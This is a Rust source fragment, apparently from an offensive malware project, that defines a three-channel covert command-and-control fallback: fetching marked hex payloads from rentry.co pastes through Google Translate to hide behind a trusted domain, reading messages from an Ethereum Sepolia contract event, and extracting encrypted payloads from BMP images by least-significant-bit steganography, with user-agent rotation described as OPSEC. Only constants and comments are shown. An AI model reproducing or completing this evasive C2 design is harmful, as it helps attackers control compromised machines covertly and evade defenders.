// Source: dark_crystal/crowd/src/edo_dead_drop.rs
// Technique: T015 - Edo Dead Drop (Autonomous C2 via covert channels)
// Tier: S
//
// Three-channel fallback chain for autonomous C2 without RAVEN server:
// 1. Google Translate proxy → rentry.co paste (read-only, primary)
// 2. Ethereum smart contract on Sepolia (bidirectional)
// 3. LSB steganography in BMP images (payload delivery)

const GT_HOST: &str = "translate.google.com";
const GT_PORT: u16  = 443;
const MARKER_BEGIN: &[u8] = b"---EDO_BEGIN---";
const MARKER_END:   &[u8] = b"---EDO_END---";

// Ethereum Message event topic (RavenC2 contract)
const MSG_EVENT_TOPIC: &str =
    "0xafb4ccb78f1474d274fbc1448b20a17655e2da57d1dd99bb0aa2e5adcb4e80df";

// User-Agent rotation for OPSEC
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Microsoft-CryptoAPI/10.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/125.0.0.0",
];

// BMP steganography constants
const BMP_MAGIC: u16 = 0x4D42;     // "BM"
const BMP_OFFSET_OFF: usize = 10;  // Pixel data offset
const BMP_WIDTH_OFF: usize  = 18;
const BMP_HEIGHT_OFF: usize = 22;
const BMP_BPP_OFF: usize    = 28;  // Bits per pixel

/// Channel 1: Google Translate proxy fetches content from rentry.co
/// through translate.google.com — request goes to a trusted Google domain.
/// Parses HTML for ---EDO_BEGIN---{hex}---EDO_END--- markers.

/// Channel 3: LSB Steganography extraction
/// First 32 LSB-bits = payload length (LE u32)
/// Remaining LSBs = payload bytes from R,G,B channels

/// All payloads: zstd compressed + AES-256-GCM encrypted
